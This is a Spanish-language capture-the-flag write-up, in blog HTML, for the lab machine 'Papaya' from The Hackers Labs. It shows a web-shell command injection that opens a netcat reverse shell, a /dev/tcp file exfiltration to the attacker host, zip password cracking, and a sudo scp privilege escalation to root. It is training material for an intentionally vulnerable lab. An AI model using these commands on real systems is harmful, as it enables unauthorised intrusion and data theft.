@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-BNTQPFSFW4"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-BNTQPFSFW4');
+</script>
+
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>murrusko | Papaya</title>
+  
+  <link rel="stylesheet" href="/assets/css/post.css" />
+  <link rel="stylesheet" href="/assets/css/syntax.css" />
+  
+  <link rel="stylesheet" href="/assets/css/common.css" />
+  <script src="/assets/js/categories.js"></script>
+  <script>
+    const currentTheme = localStorage.getItem("theme");
+    if (currentTheme) {
+      document.documentElement.setAttribute(
+        "data-theme",
+        localStorage.getItem("theme")
+      );
+    }
+  </script>
+  
+  <script defer src="/assets/js/lbox.js"></script>
+  
+</head>
+
+  <body>
+    <main>
+      <header>
+  <a class="site-title" href="/">murrusko</a>
+  <!-- dark/light mode -->
+  <span id="dark-mode-toggle" style="cursor: pointer">
+    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewbox="0 0 16 16" height="1.2em" width="1.2em" xmlns="http://www.w3.org/2000/svg">
+      <path d="M8 1a7 7 0 1 0 0 14A7 7 0 0 0 8 1zm0 13V2a6 6 0 1 1 0 12z"></path>
+    </svg>
+  </span>
+</header>
+
+      <section class="article">
+        <div class="article-header">
+          <h2 class="article-title">Papaya</h2>
+          <small class="date">03 Jul 2024</small>
+          <div class="categories">
+            
+            <a href="#!" class="category">thl</a>
+            
+            <a href="#!" class="category">ctf</a>
+            
+            <a href="#!" class="category">linux</a>
+            
+            <a href="#!" class="category">principiante</a>
+            
+          </div>
+        </div>
+        <div class="content">
+<p><img src="/assets/images/papaya/papa.jpg" alt="image"></p>
+
+<p>Estamos ante una máquina Linux de nivel avanzado creada por <a href="https://www.curiosidadesdehackers.com/">CuriosidadesDeHackers</a> y <a href="https://www.youtube.com/@CondorHacks">condor</a> de la plataforma <a href="https://thehackerslabs.com/">The Hackers Labs</a>.</p>
+
+<p>Una vez importada la máquina a nuestro VirtualBox hacemos un escaneo de IPs a nuestra red:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>arp-scan <span class="nt">-I</span> eth1 <span class="nt">--localnet</span>
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>murrusko: 
+Interface: eth1, <span class="nb">type</span>: EN10MB, MAC: 08:00:27:5e:91:9b, IPv4: 10.0.2.5
+Starting arp-scan 1.10.0 with 256 hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
+10.0.2.1        52:54:00:12:35:00       QEMU
+10.0.2.2        52:54:00:12:35:00       QEMU
+10.0.2.3        08:00:27:80:58:9b       PCS Systemtechnik GmbH
+10.0.2.147      08:00:27:5a:99:51       PCS Systemtechnik GmbH
+</code></pre></div></div>
+
+<h1 id="enumeración">Enumeración</h1>
+
+<p>Como vemos la máquina tiene asignada la IP <code class="language-plaintext highlighter-rouge">10.0.2.147</code>.</p>
+
+<p>Empezamos realizando un escaneo de puertos con <code class="language-plaintext highlighter-rouge">nmap</code>. Hacemos un escaneo silencioso<code class="language-plaintext highlighter-rouge">-sS</code>, a todos los puertos <code class="language-plaintext highlighter-rouge">-p-</code>, que nos de detalles del escaneo <code class="language-plaintext highlighter-rouge">-v</code>, que no haga ping al host <code class="language-plaintext highlighter-rouge">-Pn</code>, que no haga resolución de DNS <code class="language-plaintext highlighter-rouge">-n</code> a nuestra máquina victima <code class="language-plaintext highlighter-rouge">10.0.2.147</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> 10.0.2.147
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+</code></pre></div></div>
+
+<p>Una vex que tenemos qué puertos están abiertos hacemos otro escaneo con <code class="language-plaintext highlighter-rouge">nmap</code>, pero esta vez para ver con mas detalle que hay en esos puertos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p21</span>,22,80 <span class="nt">-v</span> 10.0.2.147
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp
+| fingerprint-strings: 
+|   GenericLines: 
+|     220 Servidor ProFTPD <span class="o">(</span>Debian<span class="o">)</span> <span class="o">[</span>::ffff:10.0.2.147]
+|     Orden incorrecta: Intenta ser m
+|     creativo
+|     Orden incorrecta: Intenta ser m
+|     creativo
+|   Help: 
+|     220 Servidor ProFTPD <span class="o">(</span>Debian<span class="o">)</span> <span class="o">[</span>::ffff:10.0.2.147]
+|     214-Se reconocen las siguiente 
+|     rdenes <span class="o">(</span><span class="k">*</span> <span class="o">=&gt;</span><span class="s1">'s no implementadas):
+|     XCWD CDUP XCUP SMNT* QUIT PORT PASV 
+|     EPRT EPSV ALLO RNFR RNTO DELE MDTM RMD 
+|     XRMD MKD XMKD PWD XPWD SIZE SYST HELP 
+|     NOOP FEAT OPTS HOST CLNT AUTH* CCC* CONF* 
+|     ENC* MIC* PBSZ* PROT* TYPE STRU MODE RETR 
+|     STOR STOU APPE REST ABOR RANG USER PASS 
+|     ACCT* REIN* LIST NLST STAT SITE MLSD MLST 
+|     comentario a root@papaya
+|   NULL, SMBProgNeg, SSLSessionReq: 
+|_    220 Servidor ProFTPD (Debian) [::ffff:10.0.2.147]
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--   1 ftp      ftp            19 Jul  2 15:26 secret.txt
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
+| ssh-hostkey: 
+|   256 bb:05:10:69:18:eb:e3:44:2c:a7:68:98:d0:97:01:20 (ECDSA)
+|_  256 65:41:aa:54:a6:b7:f7:2a:04:2e:c4:6a:c0:4d:10:35 (ED25519)
+80/tcp open  http    Apache httpd 2.4.59
+|_http-title: Did not follow redirect to http://papaya.thl/
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.59 (Debian)
+</span></code></pre></div></div>
+
+<p>De este último escaneo obtenemos que la web tiene como nombre de dominio <strong>papaya.thl</strong> y que podemos acceder al <strong>FTP</strong> de forma anónima.  Primero añadimos el dominio a nuestro fichero <strong>hosts</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"10.0.2.147 papaya.thl"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+10.0.2.147 papaya.thl
+</code></pre></div></div>
+
+<p>Y después nos conectamos al servidor FTP para ver si encontramos algo. Usamos las credenciales <strong>ftp:ftp</strong> y nos descargamos todo lo que encontremos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp 10.0.2.147
+Connected to 10.0.2.147.
+220 Servidor ProFTPD <span class="o">(</span>Debian<span class="o">)</span> <span class="o">[</span>::ffff:10.0.2.147]
+Name <span class="o">(</span>10.0.2.147:murrusko<span class="o">)</span>: ftp
+331 Conexión anónima ok, envía tu dirección de email como contraseña
+Password: 
+230 Aceptado acceso anónimo, aplicadas restricciones
+Remote system <span class="nb">type </span>is UNIX.
+Using binary mode to transfer files.
+ftp&gt; <span class="nb">ls
+</span>229 Entering Extended Passive Mode <span class="o">(||</span>|1408|<span class="o">)</span>
+150 Abriendo conexión de datos en modo ASCII para file list
+<span class="nt">-rw-r--r--</span>   1 ftp      ftp            19 Jul  2 15:26 secret.txt
+226 Transferencia completada
+ftp&gt; get secret.txt
+<span class="nb">local</span>: secret.txt remote: secret.txt
+229 Entering Extended Passive Mode <span class="o">(||</span>|43904|<span class="o">)</span>
+150 Opening BINARY mode data connection <span class="k">for </span>secret.txt <span class="o">(</span>19 bytes<span class="o">)</span>
+100% |<span class="k">******************</span>|    19       11.75 KiB/s    00:00 ETA
+226 Transferencia completada
+19 bytes received <span class="k">in </span>00:00 <span class="o">(</span>4.68 KiB/s<span class="o">)</span>
+ftp&gt; bye
+221 Hasta luego
+</code></pre></div></div>
+
+<p>Vemos que contiene el fichero <strong>secret.txt</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>secret.txt 
+ndhvabunlanqnpbñb
+</code></pre></div></div>
+
+<p>Intentamos desencriptar el texto usando la técnica de <strong>ROT13</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>secret.txt | <span class="nb">tr</span> <span class="s1">'A-Za-z'</span> <span class="s1">'N-ZA-Mn-za-m'</span>
+aquinohaynadacoño
+</code></pre></div></div>
+
+<p>Nos lo guardamos por si hiciera falta.</p>
+
+<p>Ahora vamos a ver que contiene el servidor web con <strong>whatweb</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb <span class="nt">-a</span> 3 http://papaya.thl
+http://papaya.thl <span class="o">[</span>200 OK] Apache[2.4.59], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.59 <span class="o">(</span>Debian<span class="o">)]</span>, IP[10.0.2.147], JQuery[3.6.0], PasswordField[passwrd], PoweredBy[ElkArte], Script, Title[My Community - Index], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1]
+
+</code></pre></div></div>
+
+<p>Vemos que usa ElkArte, un framework en php para crear un foro. Buscando posibles exploit para ese framework encontramos el siguiente PoC <a href="https://www.exploit-db.com/exploits/52026">https://www.exploit-db.com/exploits/52026</a>. Como podemos ver se puede conseguir un RCE subiendo un theme, pero es necesario estar autenticado y tener permisos para modificar los themes. Probando las credenciales que tenemos vemos que no obtenemos acceso.</p>
+
+<p>Vamos a buscar ficheros y directorios con <strong>feroxbuster</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>feroxbuster <span class="nt">-u</span> http://papaya.thl/themes/ <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt <span class="nt">-x</span> php <span class="nt">-r</span>
+
+500      GET        4l       13w       89c http://papaya.thl/themes/test/test.php
+...
+
+</code></pre></div></div>
+
+<h1 id="intrusión">Intrusión</h1>
+
+<p>Entre otros vemos un archivo un tanto raro. Si hemos leido el enlace anterior vemos que el fichero coincide con el PoC. Vamos a probar a ver que nos responde:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://papaya.thl/themes/test/test.php
+<span class="c"># Execute one command</span>
+www-data
+
+<span class="c"># Take input from the url paramter. shell.php?cmd=whoami</span>
+</code></pre></div></div>
+
+<p>Vemos que ejecuta un comando como www-data, pero para ello hay que añadir a la petición <strong>?cmd=comando.</strong> Nos ponemos a la escucha en nuestra máquina. Para obtener una shell reversa hay que mandar el comando encodeado como URL:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://papaya.thl/themes/test/test.php?cmd<span class="o">=</span>busybox+nc+10.0.2.5+8888+-e+bash
+</code></pre></div></div>
+
+<p>Y obtenemos la shell reversa. Hacemos el tratamiento de la shell para obtener la TTY completa:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-nlvp</span> 8888
+listening on <span class="o">[</span>any] 8888 ...
+connect to <span class="o">[</span>10.0.2.5] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.0.2.147] 59434
+script /dev/null <span class="nt">-qc</span> bash
+www-data@papaya:/var/www/html/elkarte/themes/test<span class="nv">$ </span>^Z
+zsh: suspended  nc <span class="nt">-nlvp</span> 8888
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
+<span class="o">[</span>1]  + continued  nc <span class="nt">-nlvp</span> 8888
+<span class="nb">ls
+</span>test.php
+www-data@papaya:/var/www/html/elkarte/themes/test<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
+www-data@papaya:/var/www/html/elkarte/themes/test<span class="nv">$ </span>reset
+www-data@papaya:/var/www/html/elkarte/themes/test<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Una vez dentro del sistema vemos que hay un usuario llamado <strong>papaya</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@papaya:/<span class="nv">$ </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep </span>bash
+root:x:0:0:root:/root:/bin/bash
+papaya:x:1000:1000:,,,:/home/papaya:/bin/bash
+</code></pre></div></div>
+
+<p>Haciendo una búsqueda por el servidor nos encontramos con un fichero <strong>zip</strong> en el directorio <strong>/opt:</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@papaya:/home<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /opt/
+total 4
+<span class="nt">-rwxr-xr-x</span> 1 root root 173 Jul  2 17:14 pass.zip
+</code></pre></div></div>
+
+<p>Nos ponemos a la eschucha en nuestra máquina redirigiéndo la salida a un fichero llamado <strong>pass.zip</strong> y nos mandamos el fichero zip del servidor a nuestra máquina:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@papaya:/opt<span class="nv">$ </span><span class="nb">cat </span>pass.zip <span class="o">&gt;</span> /dev/tcp/10.0.2.5/8889
+
+<span class="nv">$ </span>nc <span class="nt">-nlvp</span> 8889 <span class="o">&gt;</span> pass.zip
+listening on <span class="o">[</span>any] 8889 ...
+connect to <span class="o">[</span>10.0.2.5] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.0.2.147] 35802
+</code></pre></div></div>
+
+<p>Intentamos descomprimirlo pero vemos que es necesaria una clave para extraer el contenido. Usando <strong>zip2john</strong> creamos el hash del fichero para luego intentar crackearlo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zip2john pass.zip <span class="o">&gt;</span> pass.hash
+ver 2.0 pass.zip/pass.txt PKZIP Encr: <span class="nv">cmplen</span><span class="o">=</span>23, <span class="nv">decmplen</span><span class="o">=</span>11, <span class="nv">crc</span><span class="o">=</span>EEA46B01 <span class="nv">ts</span><span class="o">=</span>89BB <span class="nv">cs</span><span class="o">=</span>eea4 <span class="nb">type</span><span class="o">=</span>0
+</code></pre></div></div>
+
+<p>Ahora usamos <strong>john</strong> para intentar encontrar la password:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt pass.hash 
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>PKZIP <span class="o">[</span>32/64]<span class="o">)</span>
+Will run 2 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+jesica           <span class="o">(</span>pass.zip/pass.txt<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Descomprimimos el fichero con la clave recién obtenida y leemos el fichero que hay dentro:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>pass.txt 
+papayarica
+</code></pre></div></div>
+
+<p>Nos logeamos como <strong>papaya</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@papaya:/opt<span class="nv">$ </span>su papaya
+Password: 
+papaya@papaya:/opt<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>papaya<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>papaya<span class="o">)</span> <span class="nv">grupos</span><span class="o">=</span>1000<span class="o">(</span>papaya<span class="o">)</span>,100<span class="o">(</span><span class="nb">users</span><span class="o">)</span>
+papaya@papaya:/opt<span class="err">$</span>
+</code></pre></div></div>
+
+<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>
+
+<p>Vamos a ver si el usuario puede ejecutar algún comando como <strong>root</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>papaya@papaya:/opt<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>papaya on papaya:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin,
+    use_pty
+
+User papaya may run the following commands on papaya:
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/scp
+</code></pre></div></div>
+
+<p>Vemos que puede usar el comando scp como root. Buscamos en <a href="https://gtfobins.github.io/gtfobins/scp/#sudo">GTFOBins</a> el comando y ejecutamos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">TF</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span><span class="si">)</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s1">'bash 0&lt;&amp;2 1&gt;&amp;2'</span> <span class="o">&gt;</span> <span class="nv">$TF</span> <span class="o">&amp;&amp;</span> <span class="nb">chmod</span> +x <span class="s2">"</span><span class="nv">$TF</span><span class="s2">"</span> <span class="o">&amp;&amp;</span> <span class="nb">sudo </span>scp <span class="nt">-S</span> <span class="nv">$TF</span> x y:
+root@papaya:~# <span class="nb">whoami</span><span class="p">;</span> <span class="nb">hostname</span><span class="p">;</span> <span class="nb">id
+</span>root
+papaya
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">grupos</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+root@papaya:~#
+</code></pre></div></div>
+
+<p>Y con esto terminamos la máquina.</p>
+
+<p>Un saludo</p>
+</div>
+      </section>
+      <footer>
+  <p>© 2024 | murrusko</p>
+</footer>
+<script src="/assets/js/mode.js" defer></script>
+
+    </main>
+    <section id="category-modal-bg"></section>
+<section id="category-modal">
+  <h1 id="category-modal-title"></h1>
+  <section id="category-modal-content"></section>
+</section>
+
+  </body>
+</html>
